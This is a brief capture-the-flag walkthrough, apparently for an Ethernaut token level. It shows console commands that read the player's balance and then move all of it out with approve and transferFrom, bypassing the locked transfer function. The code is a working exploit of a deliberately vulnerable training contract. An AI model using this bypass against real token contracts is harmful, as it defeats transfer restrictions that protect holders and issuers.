## This can be solved in the ethernaut page itself.

### Get the amount of balance using:
```
bal = await contract.balanceOf(player)
balStr = bal.toString()
```

### Instead of using the transfer function, we'd want to use transfer from instead. In order to do so, we'd need to grant approval to either another address or our own for the address to be able to call transferFrom function:
```
await contract.approve(player, balStr)
await contract.transferFrom(player, contract.address, balStr)
```